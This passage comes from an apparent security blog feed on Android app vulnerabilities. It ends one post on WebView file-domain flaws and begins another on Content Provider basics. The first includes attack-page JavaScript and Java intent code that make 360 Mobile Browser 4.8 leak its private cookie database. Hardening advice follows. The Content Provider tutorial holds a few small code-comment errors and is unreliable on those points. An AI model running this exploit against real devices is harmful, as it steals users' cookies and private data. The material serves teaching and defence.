，在File域下，能够执行任意的JavaScript代码，同源策略跨域访问能够对私有目录文件进行访问，APP对切入WebView未对file:&#x2F;&#x2F;&#x2F;形式的URL做限制，会导致隐私信息泄漏，针对聊天软件会导致信息泄漏，针对浏览器软件，会导致cookie信息泄漏</p><p><strong>setAllowFileAccessFromFileURLs</strong></p><p>在JELLY_BEAN以前的版本默认是setAllowFileAccessFromFileURLs(true),允许通过file域url中的Javascript读取其他本地文件，在JELLY_BEAN及以后的版本中默认已被是禁止。</p><p><strong>setAllowUniversalAccessFromFileURLs</strong></p><p>在JELLY_BEAN以前的版本默认是setAllowUniversalAccessFromFileURLs(true),允许通过file域url中的Javascript访问其他的源，包括其他的本地文件和http,https源的数据。在JELLY_BEAN及以后的版本中默认已被禁止。</p><p><strong>案例：360手机浏览器缺陷可导致用户敏感数据泄漏</strong></p><p>以360手机浏览器4.8版本为例，由于未对file域做安全限制，恶意APP调用360浏览器加载本地的攻击页面（比如恶意APP释放到SDCARD上的一个HTML）后，就可以获取360手机浏览器下的所有私有数据，包括webviewCookiesChromium.db下的cookie内容</p><p>攻击页面关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">getDatabase</span><span class="params">()</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line"></span><br><span class="line">     request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(request.overrideMimeType) &#123;</span><br><span class="line"></span><br><span class="line">           request.overrideMimeType(<span class="string">&#x27;text/xml&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xmlhttp = request;</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="string">&quot;file:////data/data/com.qihoo.browser/databases&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">postfix</span> <span class="operator">=</span> <span class="string">&quot;/webviewCookiesChromium.db&quot;</span>; <span class="comment">//取保存cookie的db</span></span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">path</span> <span class="operator">=</span> prefix.concat(postfix);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取本地文件代码</span></span><br><span class="line"></span><br><span class="line">    xmlhttp.open(<span class="string">&quot;GET&quot;</span>, path, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">ret</span> <span class="operator">=</span> xmlhttp.responseText;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">copyFile(); <span class="comment">//自定义函数，释放filehehe.html到sd卡上</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file:///mnt/sdcard/filehehe.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">contIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"></span><br><span class="line">contIntent.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line"></span><br><span class="line">contIntent.setData(Uri.parse(url));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"></span><br><span class="line">intent.setClassName(<span class="string">&quot;com.qihoo.browser&quot;</span>,<span class="string">&quot;com.qihoo.browser.BrowserActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">intent.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line"></span><br><span class="line">intent.setData(Uri.parse(url));</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.startActivity(intent);</span><br></pre></td></tr></table></figure><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>通过以下设置，防止越权访问，跨域等安全问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）将不必要导出的组件设置为不导出</span><br><span class="line">（<span class="number">2</span>）如果应用的需要导出包含 Webview的组件，禁止使用File域协议 </span><br><span class="line"> setAllowFileAccess(<span class="literal">false</span>)</span><br><span class="line"> setAllowFileAccessFromFileURLs(<span class="literal">false</span>)</span><br><span class="line"> setAllowUniversalAccessFromFileURLs(<span class="literal">false</span>)</span><br><span class="line"> （<span class="number">3</span>）手机厂商把手机内置的WebView与google保持更新一致</span><br><span class="line"> （<span class="number">4</span>）用户随时把手机的内置 webview以及使用的浏览器更新到最新版本</span><br></pre></td></tr></table></figure><h2 id="六、实验总结"><a href="#六、实验总结" class="headerlink" title="六、实验总结"></a>六、实验总结</h2><p>本文总结归纳了Android中的权限安全漏洞和安全配置漏洞的详细信息，并拿一些案例进行了复现讲解，本文中只是对大部分这些漏洞的一个归纳总结，里面存在的一些问题就请各位指正了，本文所用到的实验样例和相关附件，后面都会上传github，详细大家参考：<a href="https://github.com/guoxuaa/Android-Vulnerability-Mining/tree/main/1.Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">github地址</a></p><h2 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一行代码</span><br><span class="line">卢璐. Android应用权限泄露漏洞检测技术研究[D].西安电子科技大学,<span class="number">2018.</span></span><br><span class="line">姜维 Android应用安全防护和逆向分析</span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903997669638151#heading-13</span></span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903817662693384</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_38350635/article/details/103863992</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/yaq-qq/p/5843127.html</span></span><br><span class="line">ttps:<span class="comment">//www.codeleading.com/article/67095305050/</span></span><br><span class="line">https:<span class="comment">//github.com/nelenkov/android-backup-extractor/</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_43290288/article/details/98873651</span></span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000002590577</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（12）——Content Provider漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0012/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0012/</id>
    <published>2023-02-13T01:05:19.000Z</published>
    <updated>2023-12-23T09:13:44.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。</p><span id="more"></span><h2 id="二、Content-Provider初步介绍"><a href="#二、Content-Provider初步介绍" class="headerlink" title="二、Content Provider初步介绍"></a>二、Content Provider初步介绍</h2><h3 id="1-Content-Provider的基本原理"><a href="#1-Content-Provider的基本原理" class="headerlink" title="1.Content Provider的基本原理"></a>1.Content Provider的基本原理</h3><h3 id="（1）Content-Provider简介"><a href="#（1）Content-Provider简介" class="headerlink" title="（1）Content Provider简介"></a>（1）Content Provider简介</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/3.png" alt="image-20210922094010216"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android中的数据存储方式：Shared Preferences、网络存储、文件存储、外部存储、SQLite,这些存储方式一般在单独的应用程序中实现数据共享，对于不同应用之间共享数据，就要借助Content Provider。</span><br><span class="line">ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。</span><br></pre></td></tr></table></figure><h3 id="（2）Content-Provider作用"><a href="#（2）Content-Provider作用" class="headerlink" title="（2）Content Provider作用"></a>（2）Content Provider作用</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/1.png" alt="image-20210922094010216"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/2.png" alt="image-20210922094010216"></p><p>Content Provider可以使得不同APP进程之间进行数据交互和共享，即跨进程通信</p><h3 id="（3）URI详解"><a href="#（3）URI详解" class="headerlink" title="（3）URI详解"></a>（3）URI详解</h3><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p><h5 id="URI"><a href="#URI" class="headerlink" title="URI:"></a>URI:</h5><p><strong>URI的介绍：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class="line">（<span class="number">2</span>）作用：唯一标识ContentProvider &amp;其中的数据</span><br><span class="line">（<span class="number">3</span>）外界进程通过URL找到对应的ContentProvider &amp;其中数据，再进行数据操作</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/4.png" alt="image-20210922094010216"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）标准前缀:content:<span class="comment">// ,用来说明一个Content Provider控制这些数据</span></span><br><span class="line">（<span class="number">2</span>）URL的标识：com.carson.provider, 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证URL标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该ContentProvider的包.类的名称</span><br><span class="line">（<span class="number">3</span>）路径：User,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class="line">（<span class="number">4</span>）记录ID:id, 如果URL中包含表示需要获取的记录ID,则返回该id对应的数据，如果没有ID,就表示返回全部</span><br></pre></td></tr></table></figure><p><strong>构建URI的路径：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）操作User表中id为<span class="number">11</span>的记录，构建数据：/User/<span class="number">11</span></span><br><span class="line">（<span class="number">2</span>）操作User表中id为<span class="number">11</span>的记录的name字段：User/<span class="number">11</span>/name</span><br><span class="line">（<span class="number">3</span>）操作User表中的所有记录：/User</span><br><span class="line">（<span class="number">4</span>）操作来自文件、xml或网络其他存储方式的数据，如要操作xml文件中User节点下的name字段：/User/name</span><br><span class="line">（<span class="number">5</span>）若要将一个字符串转换成URI,可以使用Uri类中的parse()方法：</span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.carson.provider/User&quot;</span>)；</span><br></pre></td></tr></table></figure><p><strong>URI各部分的获取：</strong></p><p>我们给出一个URI的样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</span><br></pre></td></tr></table></figure><p>我们介意使用一些方法来获取URI的各个部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getScheme()：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class="line"><span class="title function_">getHost</span><span class="params">()</span>：获取 Authority 中的 Host 字符串，即 www.baidu.com</span><br><span class="line"><span class="title function_">getPost</span><span class="params">()</span>：获取 Authority 中的 Port 字符串，即 <span class="number">8080</span></span><br><span class="line">getPath()：获取 Uri 中 path 部分，即 wenku/jiatiao.html</span><br><span class="line"><span class="title function_">getQuery</span><span class="params">()</span>：获取 Uri 中的 query 部分，即 id=<span class="number">15</span>&amp;name=jack</span><br></pre></td></tr></table></figure><h5 id="MIME"><a href="#MIME" class="headerlink" title="MIME:"></a>MIME:</h5><p>MIME是指定某个扩展名的文件用一种应用程序打开，就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text/html</span><br><span class="line">text/css</span><br><span class="line">text/xml</span><br><span class="line">application/pdf</span><br></pre></td></tr></table></figure><p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p><ul><li>集合记录（dir）:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnd.android.cursor.dir/自定义 </span><br></pre></td></tr></table></figure><ul><li>单条记录（item）:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnd.android.cursor.item/自定义 </span><br></pre></td></tr></table></figure><p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p><h5 id="URI解析"><a href="#URI解析" class="headerlink" title="URI解析:"></a>URI解析:</h5><p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：UriMatcher 和 ContentUris</p><p><strong>UriMatcher：</strong></p><p>UriMatcher类用于匹配Uri，使用步骤如下：</p><ul><li>将需要匹配的Uri路径进行注册：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面三个部分都匹配上了就 OK</p><p>补充：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:表示匹配任意长度的任意字符</span><br><span class="line">#:表示匹配任意长度的数字</span><br><span class="line">匹配任意表的内容URI格式：</span><br><span class="line">content：<span class="comment">//com.example.app.provider/*</span></span><br><span class="line">匹配table表中<span class="number">1</span>任意一行数据的内容URI格式：</span><br><span class="line">content：<span class="comment">//com.example.app.procider/table/#</span></span><br></pre></td></tr></table></figure><ul><li>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ContentUris:</strong></p><p>ContentUris类用于操作Uri路径后面的ID部分，有两个比较实用的方法：withAppendedId(Uri uri, long id)和parseId(Uri uri)</p><ul><li>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure><ul><li>parseId(Uri uri)则从路径中获取ID部分:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//获取的结果为：7</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure><h3 id="（4）Content-Provider数据共享"><a href="#（4）Content-Provider数据共享" class="headerlink" title="（4）Content Provider数据共享"></a>（4）Content Provider数据共享</h3><p>ContentProvider是一个抽象类，我们需要开发自己的内容提供者就需要继承这个类并复写其方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ContentProvider 类主要方法的介绍：</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span>，在ContentProvider创建后就会被调用，而ContentProvider是在其它应用第一次访问它时被创建；</span><br><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，供外部应用向ContentProvider添加数据；</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，供外部应用从ContentProvider删除数据；</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，供外部应用更新ContentProvider中的数据；</span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，供外部应用从ContentProvider中获取数据；</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span>，返回当前Uri所代表数据的MIME类型；</span><br></pre></td></tr></table></figure><p>如果操作的数据属于集合类型，那么 MIME 类型字符串应该以 vnd.android.cursor.dir&#x2F; 开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要得到所有 tablename 记录： Uri 为 content:<span class="comment">//com.wang.provider.myprovider/tablename，那么返回的MIME类型字符串应该为vnd.android.cursor.dir/table</span></span><br></pre></td></tr></table></figure><p>如果要操作的数据属于非集合类型数据，那么 MIME 类型字符串应该以 vnd.android.cursor.item&#x2F; 开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要得到 id 为 <span class="number">10</span> 的 tablename 记录，Uri 为 content:<span class="comment">//com.wang.provider.myprovider/tablename/10，那么返回的 MIME 类型字符串为：vnd.android.cursor.item/tablename </span></span><br></pre></td></tr></table></figure><h3 id="（5）Content-Resolver操作数据"><a href="#（5）Content-Resolver操作数据" class="headerlink" title="（5）Content Resolver操作数据"></a>（5）Content Resolver操作数据</h3><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p><p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/5.png" alt="image-20210922094010216"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure><p>这些方法的第一个参数为Uri，代表要操作的ContentProvider和对其中的什么数据进行操作，其实和ContentProvider里面的方法是一样的，最终会被传到我们之前程序里面定义的ContentProvider方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假定给定的是：Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename/10&quot;</span>)，</span><br><span class="line">那么将会对主机名为com.wang.provider.myprovider的ContentProvider进行操作，操作的数据为tablename表中id为<span class="number">10</span>的记录</span><br></pre></td></tr></table></figure><p>使用ContentResolver对ContentProvider中的数据进行操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//添加一条记录</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values); </span><br><span class="line"> <span class="comment">//获取tablename表中所有记录</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//把id为1的记录的name字段值更改新为zhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//删除id为2的记录，即字段age</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> 